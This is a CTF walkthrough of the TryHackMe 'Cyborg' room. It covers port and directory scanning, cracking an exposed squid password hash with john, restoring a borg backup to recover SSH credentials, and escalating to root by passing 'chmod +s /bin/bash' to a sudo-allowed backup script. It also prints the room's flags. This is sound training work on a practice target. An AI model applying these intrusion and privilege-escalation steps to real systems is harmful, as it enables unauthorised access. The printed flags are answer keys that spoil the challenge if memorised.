---
title: "[CTF] Tryhackme - Cyborg"
date: 2025-01-05 12:00:00 -500 
categories: [CTF - Tryhackme, Cyborg]
tags: [ctf,exploit,flags,tryhackme,pentesting,]
author: Christoph K
---
[TryHackMe- Sticker Shop ](https://tryhackme.com/r/room/cyborgt8)



## TASKS

- What is the user flag?
- What is the root flag?



## Scan the target

First we scan for open ports. I use `Rustscan`for this, because the scanning is way faster than `nmap` and when `Rustscan` found an open port, it forwards it to `nmap`.


```bash


─$ rustscan -a cyborg.thm -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/admin/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.68.95:22
Open 10.10.68.95:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A" on ip 10.10.68.95
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 15:19 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
Initiating Ping Scan at 15:19
Scanning 10.10.68.95 [2 ports]
Completed Ping Scan at 15:19, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 15:19
Scanning cyborg.thm (10.10.68.95) [2 ports]
Discovered open port 22/tcp on 10.10.68.95
Discovered open port 80/tcp on 10.10.68.95
Completed Connect Scan at 15:19, 0.04s elapsed (2 total ports)
Initiating Service scan at 15:19
Scanning 2 services on cyborg.thm (10.10.68.95)
Completed Service scan at 15:20, 6.11s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.68.95.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 1.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.16s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
Nmap scan report for cyborg.thm (10.10.68.95)
Host is up, received conn-refused (0.040s latency).
Scanned at 2025-01-05 15:19:59 CET for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20=
|   256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.94 seconds
```

 
We found 2 open ports: `ssh` and `http`. 



## Enumerate Http

For enumerating `http` I have following pattern:
- using `dirsearch`/`gobuster` to scan for hidden directories
- Check Source Code
- Browse the website
- vHost Fuzzing



### dirsearch/gobuster

We use `dirsearch` this time, because its very easy to use. We dont even need to give a path for a wordlist. We have the following result:
```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ dirsearch -u 10.10.69.129
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/admin/reports/_10.10.69.129/_25-01-06_09-57-52.txt

Target: http://10.10.69.129/

[09:57:52] Starting:
[09:57:54] 403 -  277B  - /.ht_wsr.txt
[09:57:54] 403 -  277B  - /.htaccess.bak1
[09:57:54] 403 -  277B  - /.htaccess.sample
[09:57:54] 403 -  277B  - /.htaccess.orig
[09:57:54] 403 -  277B  - /.htaccess.save
[09:57:54] 403 -  277B  - /.htaccess_extra
[09:57:54] 403 -  277B  - /.htaccess_sc
[09:57:54] 403 -  277B  - /.htaccessBAK
[09:57:54] 403 -  277B  - /.htaccess_orig
[09:57:54] 403 -  277B  - /.htaccessOLD
[09:57:54] 403 -  277B  - /.htaccessOLD2
[09:57:54] 403 -  277B  - /.htm
[09:57:54] 403 -  277B  - /.html
[09:57:54] 403 -  277B  - /.htpasswd_test
[09:57:54] 403 -  277B  - /.htpasswds
[09:57:54] 403 -  277B  - /.httr-oauth
[09:57:57] 301 -  312B  - /admin  ->  http://10.10.69.129/admin/
[09:57:57] 200 -    2KB - /admin/
[09:57:57] 200 -    2KB - /admin/admin.html
[09:57:57] 200 -    2KB - /admin/index.html
[09:58:04] 301 -  310B  - /etc  ->  http://10.10.69.129/etc/
[09:58:04] 200 -  445B  - /etc/
[09:58:14] 403 -  277B  - /server-status
[09:58:14] 403 -  277B  - /server-status/
```

It looks like there are some interesting hits:
- `/admin`
- `/etc`


### Browse the website


#### /admin


We first check the `/admin` page. We can see a very intersting converstation there between some admins. One post talks about a `backup`. We also are able to download a `music_archive`backup. 

![Conversation](assets/img/tryhackme/cyborg/01.png)

We dont have a login or similar so lets see what we downloaded here after unpack the `tar` file.

```bash
/home/admin/Desktop/thm/cybort/home/
└── field
    └── dev
        └── final_archive
            ├── config
            ├── data
            │   └── 0
            │       ├── 1
            │       ├── 3
            │       ├── 4
            │       └── 5
            ├── decode.txt
            ├── hints.5
            ├── index.5
            ├── integrity.5
            ├── nonce
            ├── README
            └── reports
                └── _cyborg.thm
                    └── _25-01-05_15-57-07.txt

```

After observing every file with `strings` or `cat` it seems we have a `borg backup`.

We need to understand how to `restore`a `borg backup` to continue. 

```bash
┌──(root㉿PREDATOR-01)-[/home/admin/Desktop/thm/cybort/home/field/dev/final_archive]
└─# cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/

```

I checked how to use `borg backup` to create a backup and to restore a backup. We need following commands:

- `borg list /PATH/TO/REPOSITORY` 
- `borg extract /PATH/TO/REPOSITORY::backup_name`

Lets try to list all backups:


```bash
┌──(root㉿PREDATOR-01)-[~]
└─# borg list /home/admin/Desktop/thm/cybort/home/field/dev/final_archive/
Enter passphrase for key /home/admin/Desktop/thm/cybort/home/field/dev/final_archive:
```

Unfortunately we need a passphrase here, which is not in the downloaded backup. We have so seearch somewhere else.

#### /etc

Browsing in `/etc` is a success. We can find a file named `passwd`.

![Etc](assets/img/tryhackme/cyborg/02.png)

Lets check the contents:
```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ curl http://10.10.69.129/etc/squid/passwd:
music_archive$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

and we have a `config` file from `squid`.
```bash
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

Perhaps we need that later.

Lets try the `passwd` as passphrase.



### Borg Backup restore

The passphrase seems to be a hash. We can use `john` to crack it. I created a file `hash` with the `passwd`file:

```
$ cat hash.txt
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

Now lets use `john`.

```bash

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)
1g 0:00:00:00 DONE (2025-01-05 16:02) 4.545g/s 178036p/s 178036c/s 178036C/s gwapame..lilica
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

And the passphrase seems to be `squidward`. Lets try to restore the backup:

```bash
└─# borg list /home/admin/Desktop/thm/cybort/home/field/dev/final_archive/
Enter passphrase for key /home/admin/Desktop/thm/cybort/home/field/dev/final_archive:
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

```

And we found our backup. Lets `extract` it.


```bash
└─# borg extract /home/admin/Desktop/thm/cybort/home/field/dev/final_archive::music_archive
```

Success! Now lets check the contents:

```bash
└─# tree home
home
└── alex
    ├── Desktop
    │   └── secret.txt
    ├── Documents
    │   └── note.txt
    ├── Downloads
    ├── Music
    ├── Pictures
    ├── Public
    ├── Templates
    └── Videos
```

Lets check the `secret.txt` and `note.txt`:

```bash
└─# cat home/alex/Desktop/secret.txt
shoutout to all the people who have gotten to this stage whoop whoop!"

└─# cat home/alex/Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```


Now this `alex:S3cretP@s3` looks like a `username` and `password`. Lets connect via `ssh` and find out if we get the `flags`.

### Connect via ssh
#### Get the user flag

And we are in with `ssh`. Lets get the `user flag`:

```bash

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

User flag: `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}` 

#### Get the root flag

Lets see what we can do with the user `alex`:

```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$
```

Seems we eare allowed to use the `backup.sh` file as `root`. Lets check if we are allowed to change the file:


```bash
alex@ubuntu:/etc/mp3backups$ ls -la
total 28
drwxr-xr-x   2 root root  4096 Dec 30  2020 .
drwxr-xr-x 133 root root 12288 Dec 31  2020 ..
-rw-r--r--   1 root root   339 Jan  6 01:24 backed_up_files.txt
-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh
-rw-r--r--   1 root root    45 Jan  6 01:24 ubuntu-scheduled.tgz
alex@ubuntu:/etc/mp3backups$
```


Okay we can just read and execute it. Have a look on the script, what is does:
```bash


#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```


After checking the script, there is an interesting interaction here:
```bash
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
```
This function gets a parameter from the command line(-c).

```bash
cmd=$($command)
echo $cmd

```
This executes the command! So we can just use `-c "cat /root/root.txt"` or we compromize the system completely.
We can give the `/bin/bash` the `SUID` bit:

```bash
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c "chmod +s /bin/bash"

```
Now we can use `bash -p` to get `bash` in `privilged mode`:
```bash

alex@ubuntu:/etc/mp3backups$ bash -p
bash-4.3# whoami
root
bash-4.3# ls
backed_up_files.txt  backup.sh  ubuntu-scheduled.tgz
bash-4.3# cd /root/
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
bash-4.3#

```
And we found our `root flag`:

Root Flag:`flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`


## Thoughts

I really enjoyed the challenge. In this challenge, we had to familiarize ourselves with new tools, such as the backup tool, and prove that you have to put a lot of research and time into pentests.
What did we learn today? 

- using `rustscan/nmap` to scan for open ports and vulnerabilities
- using `dirsearch` to scan for hidden directories
- using `john` to crack a hash with a password list
- using `borg backup` to restore a saved repository
- understand and exploit a weak `script` to compromize a machine